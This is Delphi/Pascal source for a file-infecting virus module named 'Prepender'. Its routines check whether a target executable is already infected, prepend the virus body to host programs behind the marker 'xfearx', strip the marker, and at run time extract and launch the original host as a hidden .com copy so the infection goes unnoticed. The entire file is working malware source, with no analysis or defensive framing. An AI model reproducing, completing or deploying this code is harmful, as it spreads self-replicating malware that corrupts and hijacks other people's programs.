   {$I CompMode.INI}

   {$IFDEF Debug}
   UNIT Prepender;
   {$ELSE}
   UNIT A11;
   {$ENDIF}

   INTERFACE

   {$IFDEF Debug}
   USES
     AclUtils, Windows, Utils;
   {$ELSE}
   USES
     B1, A6, Windows;
   {$ENDIF}

   PROCEDURE DropFile;
   PROCEDURE CutFile(F:STRING);
   PROCEDURE Prepend(Virus,DestinationFile:STRING);

   IMPLEMENTATION

   CONST
     BufSize = 12288;
     L       = 'XFEARX';

   FUNCTION CheckInfection(Virus,DestinationFile:STRING) : Boolean;
   LABEL
     Abort;
   VAR
     I       : WORD;
     F       : FILE;
     G       : FILE;
     Buffer1 : ARRAY [0..BufSize] OF Byte;
     Buffer2 : ARRAY [0..BufSize] OF Byte;
   BEGIN
     Result:=False;
     Filemode:=0;
     AssignFile(F,Virus);
     AssignFile(G,DestinationFile);
     {$I-}
     Reset(F,1);
     IF IOResult<>0 THEN GOTO Abort;
     Reset(G,1);
     IF IOResult<>0 THEN GOTO Abort;
     BlockRead(F,Buffer1[0],BufSize+1);
     BlockRead(G,Buffer2[0],BufSize+1);
     I:=0;
     WHILE Buffer1[I]=Buffer2[I] DO INC(I);
     IF I=BufSize+1 THEN Result:=True;
     CloseFile(F);
     CloseFile(G);
     Abort:
     {$I+}
   END;

   PROCEDURE Prepend(Virus,DestinationFile:STRING);
   LABEL
     Abort;
   VAR
     F       : FILE;
     G       : FILE;
     I       : WORD;
     T       : STRING;
     New     : STRING;
     Count   : Longint;
     Buf     : ARRAY [1..BufSize] OF Byte;
   BEGIN
     IF CheckInfection(Virus,DestinationFile) THEN EXIT;
     {$I-}
     T:=LowerCase(L);
     CopyFile(pChar(DestinationFile),pChar(DestinationFile+MainStr(1)),False);     //".tmp"
     CopyFile(pChar(Virus),pChar(DestinatioNFile),False);
     FileMode:=2;
     AssignFile(F,DestinationFile);
     AssignFile(G,DestinationFile+MainStr(1));                                     //".tmp"
     Reset(F,1);
     IF IOResult<>0 THEN GOTO Abort;
     Reset(G,1);
     IF IOResult<>0 THEN GOTO Abort;
     Seek(F,FileSize(F));
     BlockWrite(F,T[1],6);
     REPEAT
       BlockRead(G,Buf[1],BufSize,Count);
       BlockWrite(F,Buf[1],Count);
     UNTIL Count=0;
     CloseFile(G);
     CloseFile(F);
     Abort:
     {$I+}
     DeleteFile(pChar(DestinationFile+MainStr(1)));                                //".tmp"
   END;

   PROCEDURE CutFile(F:STRING);
   VAR
     G   : FILE;
     A   : Longint;
     K   : STRING;
     B   : ARRAY [1..6] OF Char;
   BEGIN
     K:=LowerCase(L);
     FileMode:=2;
     AssignFile(G,F);
     {$I-}
     Reset(G,1);
     IF IOResult<>0 THEN Exit;
     A:=FileSize(G);
     REPEAT
       BlockRead(G,B[1],6);
       IF B<>K THEN Seek(G,FilePos(G)-5);
     UNTIL(FilePos(G)=A-6)OR(B=K);
     IF B=K THEN BEGIN
       Seek(G,FilePos(G)-6);
       Truncate(G);
     END;
     CloseFile(G);
     {$I+}
   END;

   PROCEDURE DropFile;
   VAR
     G     : FILE;
     S     : STRING;
     K     : STRING;
     T     : Longint;
     I     : Longint;
     Count : Longint;
     B     : ARRAY [1..6] OF Char;
     J     : ARRAY [1..BufSize] OF Byte;
   BEGIN
     K:=LowerCase(L);
     FileMode:=0;
     AssignFile(G,ParamStr(0));
     {$I-}
     Reset(G,1);
     IF IOResult<>0 THEN Exit;
     REPEAT
       BlockRead(G,B[1],6);
       IF B<>K THEN Seek(G,FilePos(G)-5);
     UNTIL(FilePos(G)=FileSize(G)-6)OR(B=K);
     T:=FilePos(G);
     CloseFile(G);
     IF B<>K THEN Exit;
     S:=Copy(ParamStr(0),1,Length(ParamStr(0))-3)+'com';
     CopyFile(pChar(ParamStr(0)),pChar(S),False);
   //  SetFileAttributes(pChar(S),FILE_ATTRIBUTE_HIDDEN);
     FileMode:=2;
     AssignFile(G,S);
     Reset(G,1);
     IF IOResult<>0 THEN Exit;
     I:=0;
     REPEAT
       Seek(G,I+T);
       BlockRead(G,J[1],BufSize,Count);
       Seek(G,I);
       BlockWrite(G,J[1],Count);
       I:=I+Count;
     UNTIL Count<>BufSize;
     Truncate(G);
     CloseFile(G);
     WinExec(pChar(S),SW_SHOW);
     {$I+}
   END;

   END.
